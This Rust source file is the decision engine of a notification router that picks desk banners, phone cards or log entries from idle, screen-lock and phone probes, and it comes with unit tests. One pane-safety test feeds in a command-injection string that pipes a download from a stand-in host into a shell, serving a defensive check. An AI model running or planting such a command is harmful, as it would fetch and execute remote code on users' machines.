//! The engine: one event in, a delivery plan out, every decision delegated.
//!
//! This module ORCHESTRATES the decision core against the probe seams; it
//! owns no policy of its own. Two properties are load-bearing and pinned by
//! recording probes rather than by outcomes alone:
//!
//! PROBES RUN ONLY WHEN THEIR ANSWER COULD MATTER. Every reading is a spawn
//! on a path that must never stall, so a caller who already stated an answer
//! never pays for the probe underneath it: an idle override skips the idle
//! read and the screen-lock read that only exists to qualify it, and a stated
//! phone-input age skips the process walk behind it.
//!
//! CALLER INTENT IS NEVER OVERRIDDEN. Skip beats force ("I already sent it"
//! is more specific than an override), the narrowing flags beat both, and
//! force exempts the event from viewed-pane suppression.

use std::collections::BTreeMap;

use crate::probes::{
    IdleProbe, PhoneInputProbe, PhoneMarkerProbe, ScreenLockProbe, SessionViewProbe,
};
use crate::registry::Selection;
use crate::routing::Leg;
use crate::surface::{Surface, Visibility};

/// The idle threshold the bash defaults to when `PNS_DESK_IDLE_SECS` says
/// nothing: past this the operator counts as away from the desk.
pub const DEFAULT_DESK_IDLE_SECS: u64 = 120;

/// Everything the environment may override, parsed once at the edge.
/// Garbage numeric values read as absent, never as zero.
#[derive(Debug, Default, PartialEq)]
pub struct Overrides {
    pub idle_secs: Option<u64>,
    pub desk_idle_secs: Option<u64>,
    pub skip_phone: bool,
    pub force_phone: bool,
    /// A stated age for the phone's input clock, in seconds. The discovery
    /// chain behind that reading walks live processes, so a caller who
    /// already knows the answer states it and the walk never runs.
    pub phone_input_age: Option<u64>,
    /// Set when the variable was PRESENT and non-empty but not a count. The
    /// bash validators reject such a value outright rather than falling back,
    /// and the fallback is what would turn an unknown into a confident
    /// number: a probe reading where the caller overrode it, or a default
    /// threshold where the caller's was garbled.
    pub idle_invalid: bool,
    pub desk_invalid: bool,
    pub phone_invalid: bool,
}

impl Overrides {
    /// Parse the PNS_* and PNS_* variables out of an environment map.
    pub fn from_env(vars: &BTreeMap<String, String>) -> Self {
        // A present-but-garbled value is reported alongside the None, so the
        // caller can refuse it rather than fall back to a default.
        let read = |key: &str| match vars.get(key).filter(|raw| !raw.is_empty()) {
            None => (None, false),
            Some(raw) => {
                let parsed = crate::parse_count(raw);
                (parsed, parsed.is_none())
            }
        };
        let set = |key: &str| vars.get(key).is_some_and(|raw| !raw.is_empty());
        let (idle_secs, idle_invalid) = read("PNS_IDLE_SECS");
        let (desk_idle_secs, desk_invalid) = read("PNS_DESK_IDLE_SECS");
        let (phone_input_age, phone_invalid) = read("PNS_PHONE_INPUT_AGE");
        Self {
            idle_secs,
            desk_idle_secs,
            skip_phone: set("PNS_SKIP_PHONE"),
            force_phone: set("PNS_FORCE_PHONE"),
            phone_input_age,
            idle_invalid,
            desk_invalid,
            phone_invalid,
        }
    }
}

/// What the engine decided for one event.
#[derive(Debug, PartialEq)]
pub struct Decision {
    /// The legs to dispatch, in delivery order.
    pub legs: Vec<Leg>,
    /// The lights signal, which rides on top of every long-running event
    /// rather than being a leg of its own.
    pub pulse: bool,
    /// The pane was dropped from the event because it failed the safety
    /// check; the caller prints the one warning.
    pub pane_dropped: bool,
}

/// Decide the plan for one event. `now_secs` is the wall clock, taken once at
/// the edge; `None` reads as an unreadable clock, which ages nothing.
///
/// ASSEMBLY ONLY. Where the operator is looking is `surface::surface`, whether
/// the origin pane is on screen is `surface::visibility`, and what to do about
/// it is `surface::plan`. This reads the probes those three need and turns the
/// plan into legs.
#[allow(clippy::too_many_arguments)]
pub fn decide<P>(
    probes: &P,
    selection: &Selection,
    overrides: &Overrides,
    local_only: bool,
    remote_only: bool,
    pane: &str,
    now_secs: Option<u64>,
    long_running: bool,
    mobile_watch_card: bool,
) -> Decision
where
    P: IdleProbe + PhoneMarkerProbe + PhoneInputProbe + ScreenLockProbe + SessionViewProbe,
{
    let world = read_world(probes, overrides, pane, now_secs);
    let delivery = crate::surface::plan(
        world.surface,
        world.visibility,
        long_running,
        mobile_watch_card,
    );
    // The two caller overrides survive the arbitration they used to steer:
    // skip beats force, and both beat the surface.
    let delivery = crate::surface::DeliveryPlan {
        phone_card: !overrides.skip_phone && (overrides.force_phone || delivery.phone_card),
        ..delivery
    };

    Decision {
        legs: crate::routing::channel_plan(selection, local_only, remote_only, delivery),
        pane_dropped: !pane.is_empty() && !crate::safety::pane_is_safe(pane),
        pulse: delivery.pulse,
    }
}

/// Everything the delivery decision rests on, read ONCE and passed down.
///
/// THE TIMING CONTRACT, operator ruling 2026-08-13: the decision evaluates
/// the world at the LAST MOMENT BEFORE DELIVERY, and never earlier than the
/// return of the work being reported on. What that means in use: watching the
/// referenced pane when the banner would fire suppresses it, even if the
/// operator was away when the turn actually ended, and a fast shell command
/// decides effectively at its return because nothing delays it. This is the
/// clarified form of the D1-era at-send-time wording.
///
/// So the reading is taken here, at dispatch, and NOTHING BELOW THIS POINT
/// touches a probe: one decision cannot be split across two readings that
/// disagree about where the operator is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct WorldSnapshot {
    surface: Surface,
    visibility: Visibility,
}

/// Take the snapshot. The only probe access on the delivery path.
fn read_world<P>(
    probes: &P,
    overrides: &Overrides,
    pane: &str,
    now_secs: Option<u64>,
) -> WorldSnapshot
where
    P: IdleProbe + PhoneMarkerProbe + PhoneInputProbe + ScreenLockProbe + SessionViewProbe,
{
    let reading = surface_reading(probes, overrides, now_secs);
    WorldSnapshot {
        surface: reading.surface,
        // The session reports one fact for every client, and a phone with
        // moshi closed is not one of them: see `surface::effective_visibility`.
        visibility: crate::surface::effective_visibility(
            reading.surface,
            reading.phone_input_fresh,
            operator_visibility(probes, pane),
        ),
    }
}

/// Where the operator is, and whether the PHONE'S OWN clock is what says so.
///
/// The two come out together because they are one judgement over one set of
/// readings. Deriving the phone's freshness a second time somewhere else is
/// how the arbitration and the visibility rule beside it would come to
/// disagree about whether the phone was just used.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct SurfaceReading {
    surface: Surface,
    /// The phone's pty clock is fresh: moshi is open and taking input. False
    /// on a Mobile surface means the Back Tap alone put the operator there.
    phone_input_fresh: bool,
}

/// Where the operator is, from the four readings the arbitration needs.
///
/// Public because the blocking hook asks the same question for a different
/// reason: whether the operator can answer from the phone at all.
///
/// EVERY READING IS GUARDED by the verdict that would discard it: a caller who
/// already stated the answer never pays for the probe underneath it.
pub fn operator_surface<P>(probes: &P, overrides: &Overrides, now_secs: Option<u64>) -> Surface
where
    P: IdleProbe + PhoneMarkerProbe + PhoneInputProbe + ScreenLockProbe,
{
    surface_reading(probes, overrides, now_secs).surface
}

/// The arbitration and the freshness of the reading behind it, in one pass
/// over the probes.
fn surface_reading<P>(probes: &P, overrides: &Overrides, now_secs: Option<u64>) -> SurfaceReading
where
    P: IdleProbe + PhoneMarkerProbe + PhoneInputProbe + ScreenLockProbe,
{
    // A garbled threshold is UNKNOWN, never the default: substituting 120
    // would read a stale desk as fresh and hold the operator at their desk.
    let desk_fresh_secs = if overrides.desk_invalid {
        None
    } else {
        Some(overrides.desk_idle_secs.unwrap_or(DEFAULT_DESK_IDLE_SECS))
    };
    let Some(desk_fresh_secs) = desk_fresh_secs else {
        // With no window to measure against, nothing can be called fresh.
        return SurfaceReading {
            surface: Surface::Away,
            phone_input_fresh: false,
        };
    };

    // THE LOCK IS READ ONLY WHERE THE IDLE CLOCK ANSWERED, because its only
    // job is to disqualify what that probe reported: a desk reading the
    // caller stated, never took, or could not take leaves the lock a spawn
    // for an answer nothing can use, and the blocked path an approval waits
    // on pays that deadline serially. Nothing in this repo sets
    // `PNS_IDLE_SECS` in production (measured repo-wide 2026-08-28); a future
    // setter would silently disable the override with it.
    let (desk_input_age, screen_locked) = if overrides.idle_invalid {
        (None, None)
    } else {
        match overrides.idle_secs {
            Some(secs) => (Some(secs), None),
            None => {
                let idle = probes.idle_secs();
                (
                    idle,
                    idle.is_some().then(|| probes.screen_locked()).flatten(),
                )
            }
        }
    };
    // AGES, never timestamps, and both aged against the SAME clock read: an
    // unreadable clock ages nothing, which drops a phone signal out of the
    // arbitration rather than making it infinitely fresh.
    let age_of =
        |taken_at: Option<u64>| now_secs.and_then(|now| Some(now.saturating_sub(taken_at?)));
    let phone_input_age = if overrides.phone_invalid {
        None
    } else {
        match overrides.phone_input_age {
            Some(secs) => Some(secs),
            None => age_of(probes.phone_input_atime_secs()),
        }
    };
    let marker_age = age_of(probes.marker_mtime_secs());
    SurfaceReading {
        surface: crate::surface::surface(
            desk_input_age,
            phone_input_age,
            marker_age,
            desk_fresh_secs,
            screen_locked,
        ),
        phone_input_fresh: crate::surface::is_fresh(phone_input_age, desk_fresh_secs),
    }
}

/// Whether the origin pane is on screen. An unreadable view is Unknown, which
/// never suppresses.
fn operator_visibility<P: SessionViewProbe>(probes: &P, pane: &str) -> Visibility {
    if pane.is_empty() {
        return Visibility::Unknown;
    }
    match probes.session_view(pane) {
        Some(view) => crate::surface::visibility(pane, &view),
        None => Visibility::Unknown,
    }
}

#[cfg(test)]
mod tests {
    use super::{Decision, Overrides, decide, operator_surface};
    use crate::config::parse_config;
    use crate::probes::{
        IdleProbe, PhoneInputProbe, PhoneMarkerProbe, ScreenLockProbe, SessionViewProbe,
    };
    use crate::registry::Selection;
    use crate::surface::{SessionView, Surface};
    use std::cell::Cell;
    use std::collections::BTreeMap;

    /// Recording probes: every reading is counted, so a test can pin that a
    /// probe was never consulted, not only what the verdict was.
    #[derive(Default)]
    struct CountingProbes {
        idle: Option<u64>,
        marker_mtime: Option<u64>,
        phone_atime: Option<u64>,
        screen_locked: Option<bool>,
        view: Option<SessionView>,
        idle_reads: Cell<u32>,
        marker_reads: Cell<u32>,
        phone_reads: Cell<u32>,
        lock_reads: Cell<u32>,
        view_reads: Cell<u32>,
    }

    impl IdleProbe for CountingProbes {
        fn idle_secs(&self) -> Option<u64> {
            self.idle_reads.set(self.idle_reads.get() + 1);
            self.idle
        }
    }
    impl PhoneMarkerProbe for CountingProbes {
        fn marker_mtime_secs(&self) -> Option<u64> {
            self.marker_reads.set(self.marker_reads.get() + 1);
            self.marker_mtime
        }
    }
    impl PhoneInputProbe for CountingProbes {
        fn phone_input_atime_secs(&self) -> Option<u64> {
            self.phone_reads.set(self.phone_reads.get() + 1);
            self.phone_atime
        }
    }
    impl ScreenLockProbe for CountingProbes {
        fn screen_locked(&self) -> Option<bool> {
            self.lock_reads.set(self.lock_reads.get() + 1);
            self.screen_locked
        }
    }
    impl SessionViewProbe for CountingProbes {
        fn session_view(&self, _origin_pane: &str) -> Option<SessionView> {
            self.view_reads.set(self.view_reads.get() + 1);
            self.view.clone()
        }
    }

    /// A view in which the origin pane is on screen, unzoomed.
    fn watching(origin: &str) -> SessionView {
        SessionView {
            origin_tab: "t1".to_string(),
            focused_tab: "t1".to_string(),
            focused_pane: origin.to_string(),
            zoomed: false,
        }
    }

    /// A view in which the origin pane's tab is not the one on screen.
    fn elsewhere(_origin: &str) -> SessionView {
        SessionView {
            origin_tab: "t1".to_string(),
            focused_tab: "t2".to_string(),
            focused_pane: "t2:p9".to_string(),
            zoomed: false,
        }
    }

    fn three_selection() -> Selection {
        crate::registry::roster()
            .enabled(
                &parse_config(
                    "[plugins.moshi]\nenabled = true\n[plugins.hermes]\nenabled = true\n[plugins.macos-banner]\nenabled = true\n",
                )
                .unwrap(),
            )
            .unwrap()
    }

    fn names(decision: &Decision) -> Vec<&str> {
        decision.legs.iter().map(|leg| leg.name).collect()
    }

    /// One event through the whole engine, with the readings a test cares
    /// about and defaults for the rest.
    fn decide_with(probes: &CountingProbes, overrides: &Overrides, pane: &str) -> Decision {
        decide(
            probes,
            &three_selection(),
            overrides,
            false,
            false,
            pane,
            Some(1_000_000),
            false,
            false,
        )
    }

    // --- the plan drives the legs -------------------------------------------

    #[test]
    fn every_surface_and_visibility_pair_dispatches_the_legs_its_row_planned() {
        // The engine's half of the matrix: the model decides banner and card,
        // and these are the LEGS that come out of it. hermes is the durable
        // log and rides every row, which is what makes the other two the
        // observable difference.
        // (label, desk input age, session view, the legs it must dispatch)
        type Case = (
            &'static str,
            Option<u64>,
            Option<SessionView>,
            Vec<&'static str>,
        );
        let matrix: [Case; 5] = [
            (
                "at the desk watching the pane: log only",
                Some(2),
                Some(watching("wW:p1")),
                vec!["hermes"],
            ),
            (
                "at the desk, pane on another tab: banner",
                Some(2),
                Some(elsewhere("wW:p1")),
                vec!["macos-banner", "hermes"],
            ),
            (
                "at the desk, view unreadable: banner, never suppressed on doubt",
                Some(2),
                None,
                vec!["macos-banner", "hermes"],
            ),
            (
                "away, pane on screen: the card still fires",
                Some(9_000),
                Some(watching("wW:p1")),
                vec!["moshi", "hermes"],
            ),
            (
                "away, pane hidden: card, and no banner for an empty room",
                Some(9_000),
                Some(elsewhere("wW:p1")),
                vec!["moshi", "hermes"],
            ),
        ];
        for (label, idle, view, expected) in matrix {
            let probes = CountingProbes {
                idle,
                view,
                ..CountingProbes::default()
            };
            assert_eq!(
                names(&decide_with(&probes, &Overrides::default(), "wW:p1")),
                expected,
                "case: {label}"
            );
        }
    }

    #[test]
    fn a_phone_used_more_recently_than_the_desk_never_gets_a_banner() {
        // The property the matrix rests on: terminal-notifier is a desk
        // surface, and mobile is not the desk. The desk was touched 90s ago
        // and the phone 5s ago, which is drill D5's own scenario.
        let probes = CountingProbes {
            idle: Some(90),
            phone_atime: Some(999_995),
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(!legs.contains(&"macos-banner"), "got {legs:?}");
        assert!(legs.contains(&"moshi"), "got {legs:?}");
    }

    #[test]
    fn what_put_the_operator_on_mobile_decides_whether_the_watched_pane_suppresses() {
        // Both rows are on mobile with the origin pane reported as on screen,
        // and only the reason differs. Drill D6 (2026-08-19) found the first
        // one silent: the tap moved the surface, the desk display had the pane
        // focused for nobody, and mobile-plus-visible ate the card.
        // (label, marker mtime, phone pty atime, the legs it must dispatch)
        type Case = (&'static str, Option<u64>, Option<u64>, Vec<&'static str>);
        let matrix: [Case; 2] = [
            (
                "D6: tapped, moshi never opened, so nothing is being watched",
                Some(999_990),
                None,
                vec!["moshi", "hermes"],
            ),
            (
                "D5: moshi open on the pane, which is watching it for real",
                None,
                Some(999_990),
                vec!["hermes"],
            ),
        ];
        for (label, marker_mtime, phone_atime, expected) in matrix {
            let probes = CountingProbes {
                idle: Some(9_000),
                marker_mtime,
                phone_atime,
                view: Some(watching("wW:p1")),
                ..CountingProbes::default()
            };
            assert_eq!(
                names(&decide_with(&probes, &Overrides::default(), "wW:p1")),
                expected,
                "case: {label}"
            );
        }
    }

    #[test]
    fn a_tap_with_moshi_closed_cards_even_when_the_session_view_cannot_be_read() {
        // The other half of the D6 row: an unreadable view already never
        // suppressed, and the tap must not turn that into a new way to.
        let probes = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            view: None,
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(legs.contains(&"moshi"), "got {legs:?}");
        assert!(!legs.contains(&"macos-banner"), "mobile never banners");
    }

    #[test]
    fn the_long_running_tier_pulses_and_says_so_in_the_decision() {
        let probes = CountingProbes {
            idle: Some(2),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p1",
            Some(1_000_000),
            true,
            false,
        );
        assert!(decision.pulse, "the lights ride on top of every long event");
        assert_eq!(
            names(&decision),
            vec!["hermes"],
            "and change nothing else about a watched desk pane"
        );
    }

    #[test]
    fn the_mobile_watch_card_toggle_adds_the_card_only_when_it_is_on() {
        let on_the_phone = || CountingProbes {
            idle: Some(9_000),
            phone_atime: Some(999_990),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let with_toggle = |on: bool| {
            let probes = on_the_phone();
            let decision: Decision = decide(
                &probes,
                &three_selection(),
                &Overrides::default(),
                false,
                false,
                "wW:p1",
                Some(1_000_000),
                true,
                on,
            );
            decision.legs.iter().any(|leg| leg.name == "moshi")
        };
        assert!(!with_toggle(false), "default off: the pulse says it alone");
        assert!(with_toggle(true), "on: the card joins the pulse");
    }

    // --- caller intent ------------------------------------------------------

    #[test]
    fn skip_phone_beats_force_phone_because_already_sent_is_more_specific() {
        let probes = CountingProbes::default();
        let overrides = Overrides {
            skip_phone: true,
            force_phone: true,
            ..Overrides::default()
        };
        assert!(!names(&decide_with(&probes, &overrides, "")).contains(&"moshi"));
    }

    #[test]
    fn one_decision_reads_each_probe_at_most_once_and_never_twice() {
        // State at the last moment before delivery, taken ONCE (operator
        // ruling 2026-08-13). A probe consulted a second time could answer
        // differently, and one decision would then be split between two
        // readings of where the operator is.
        let probes = CountingProbes {
            idle: Some(1),
            marker_mtime: Some(999_000),
            phone_atime: Some(999_900),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        decide_with(&probes, &Overrides::default(), "wW:p1");
        for (reads, probe) in [
            (probes.idle_reads.get(), "idle"),
            (probes.marker_reads.get(), "marker"),
            (probes.phone_reads.get(), "phone input"),
            (probes.view_reads.get(), "session view"),
        ] {
            assert!(reads <= 1, "the {probe} probe was read {reads} times");
        }
        // And the view really was consulted, so the bound above is a bound
        // rather than a probe that never ran.
        assert_eq!(probes.view_reads.get(), 1);
    }

    #[test]
    fn force_phone_sends_the_card_from_the_desk_with_the_pane_in_plain_sight() {
        // The override outranks the surface entirely, which is what moshi-gate
        // and the hooks rely on.
        let probes = CountingProbes {
            idle: Some(1),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            force_phone: true,
            ..Overrides::default()
        };
        assert!(names(&decide_with(&probes, &overrides, "wW:p1")).contains(&"moshi"));
    }

    #[test]
    fn a_stated_phone_input_age_spares_the_process_walk_behind_it() {
        // The reading costs three spawns and a walk over live processes, so
        // a caller who already stated the answer must never pay for it.
        let probes = CountingProbes {
            idle: Some(9_000),
            phone_atime: Some(999_999),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            phone_input_age: Some(0),
            ..Overrides::default()
        };
        decide_with(&probes, &overrides, "wW:p1");
        assert_eq!(probes.phone_reads.get(), 0);
    }

    #[test]
    fn a_garbage_phone_override_is_unknown_without_a_probe_read() {
        // Same rule as the idle override beside it: a present-but-garbled
        // value is refused rather than falling back to the live reading,
        // which would let a probe answer a question the caller overrode.
        let vars = BTreeMap::from([(
            "PNS_PHONE_INPUT_AGE".to_string(),
            "not-a-number".to_string(),
        )]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(9_000),
            phone_atime: Some(999_999),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert_eq!(probes.phone_reads.get(), 0);
        assert!(
            names(&decision).contains(&"moshi"),
            "an unknown phone reading falls toward away, which cards"
        );
    }

    #[test]
    fn a_locked_screen_sends_a_blocked_approval_to_the_phone_rather_than_the_lock_screen() {
        // `operator_surface` is the approval gate: Desk means the harness
        // prompt already in front of the operator is the way to answer, and
        // anything else means the card is. A lock screen is not a prompt they
        // can answer, so the approval has to travel.
        let probes = CountingProbes {
            idle: Some(2),
            screen_locked: Some(true),
            ..CountingProbes::default()
        };
        assert_ne!(
            operator_surface(&probes, &Overrides::default(), Some(1_000_000)),
            Surface::Desk
        );
    }

    #[test]
    fn a_locked_screen_cards_the_phone_and_leaves_the_desk_banner_unraised() {
        // THE SHIPPED BUG, end to end: a keyboard touched two seconds before
        // the lock holds the surface at Desk for the rest of the freshness
        // window, so the banner fires at a lock screen and no card reaches
        // the phone. Without the lock these exact readings banner, which is
        // what makes both halves of this test bite.
        let probes = CountingProbes {
            idle: Some(2),
            screen_locked: Some(true),
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(
            legs.contains(&"moshi"),
            "the card must reach them: {legs:?}"
        );
        assert!(
            !legs.contains(&"macos-banner"),
            "nobody is in front of the display: {legs:?}"
        );
    }

    #[test]
    fn the_lock_probe_is_read_only_where_the_idle_probe_returned_a_reading() {
        // The lock's only job is to disqualify what the idle probe reported,
        // so taking it where that reading was never taken, or where it came
        // back empty, is a spawn for an answer nothing can use. The other
        // direction is the ruling: caller intent is never overridden, and
        // stating the desk clock states the desk's whole story, garbled value
        // included.
        let garbled = Overrides::from_env(&BTreeMap::from([(
            "PNS_IDLE_SECS".to_string(),
            "not-a-number".to_string(),
        )]));
        // (label, overrides, what the idle probe answers, idle reads, lock reads)
        let cases: [(&str, Overrides, Option<u64>, u32, u32); 4] = [
            (
                "nothing stated: the engine takes both readings",
                Overrides::default(),
                Some(2),
                1,
                1,
            ),
            (
                "a stated idle clock: it takes neither",
                Overrides {
                    idle_secs: Some(9_000),
                    ..Overrides::default()
                },
                Some(2),
                0,
                0,
            ),
            ("a garbled one: neither, again", garbled, Some(2), 0, 0),
            (
                "an unreadable idle clock: nothing arrived for the lock to disqualify",
                Overrides::default(),
                None,
                1,
                0,
            ),
        ];
        for (label, overrides, idle, idle_reads, lock_reads) in cases {
            let probes = CountingProbes {
                idle,
                screen_locked: Some(true),
                ..CountingProbes::default()
            };
            decide_with(&probes, &overrides, "");
            assert_eq!(probes.idle_reads.get(), idle_reads, "case: {label}, idle");
            assert_eq!(probes.lock_reads.get(), lock_reads, "case: {label}, lock");
        }
    }

    #[test]
    fn an_overridden_idle_reading_spares_the_idle_probe() {
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            idle_secs: Some(9_000),
            ..Overrides::default()
        };
        decide_with(&probes, &overrides, "");
        assert_eq!(probes.idle_reads.get(), 0);
    }

    #[test]
    fn a_phone_probe_that_read_nothing_leaves_the_operator_at_their_desk() {
        // The discovery chain walks live processes and any step can come back
        // empty. Reading that as "just used" would put the operator on a
        // phone that is not in their hand and silence the banner in front of
        // them, so no reading has to mean no phone.
        let probes = CountingProbes {
            idle: Some(2),
            phone_atime: None,
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(legs.contains(&"macos-banner"), "got {legs:?}");
        assert!(!legs.contains(&"moshi"), "got {legs:?}");
    }

    #[test]
    fn an_unreadable_clock_ages_no_phone_signal_rather_than_treating_it_as_fresh() {
        // Without a clock neither the pty nor the tap has an age, so both
        // drop out of the arbitration instead of counting as the newest
        // signal forever.
        let probes = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            phone_atime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
            false,
            false,
        );
        assert!(
            names(&decision).contains(&"moshi"),
            "away still cards; neither phone signal decided it"
        );
    }

    #[test]
    fn an_unreadable_clock_ages_no_marker_rather_than_treating_it_as_fresh() {
        // Without a clock the tap has no age, so it drops out of the
        // arbitration instead of counting as the newest signal forever.
        let probes = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
            false,
            false,
        );
        assert!(
            names(&decision).contains(&"moshi"),
            "away still cards; the tap simply did not decide it"
        );
    }

    // --- pane safety --------------------------------------------------------

    #[test]
    fn an_unsafe_pane_is_dropped_once_for_every_channel() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        assert!(decide_with(&probes, &Overrides::default(), "wW:p21; curl evil | sh").pane_dropped);
    }

    #[test]
    fn a_safe_pane_is_not_dropped() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        assert!(!decide_with(&probes, &Overrides::default(), "wW:p21").pane_dropped);
    }

    // --- overrides parsing --------------------------------------------------

    #[test]
    fn a_garbage_idle_override_is_unknown_without_a_probe_read() {
        // Bash keeps a non-empty override and never runs the probe. Falling
        // back to the probe would both pay the read and let a live reading
        // hold the operator at a desk the override said nothing about.
        let vars = BTreeMap::from([("PNS_IDLE_SECS".to_string(), "not-a-number".to_string())]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert_eq!(probes.idle_reads.get(), 0);
        assert!(
            names(&decision).contains(&"moshi"),
            "an unknown desk reading falls toward away, which cards"
        );
    }

    #[test]
    fn a_garbage_desk_threshold_fails_toward_away_never_into_the_default() {
        // Substituting the default would read a stale desk as fresh and hold
        // the operator at a desk they are not at.
        let vars = BTreeMap::from([("PNS_DESK_IDLE_SECS".to_string(), "0600".to_string())]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert!(names(&decision).contains(&"moshi"));
    }

    #[test]
    fn skip_and_force_parse_from_their_relay_variables() {
        let vars = BTreeMap::from([
            ("PNS_SKIP_PHONE".to_string(), "1".to_string()),
            ("PNS_FORCE_PHONE".to_string(), "1".to_string()),
        ]);
        let overrides = Overrides::from_env(&vars);
        assert!(overrides.skip_phone);
        assert!(overrides.force_phone);
    }
}
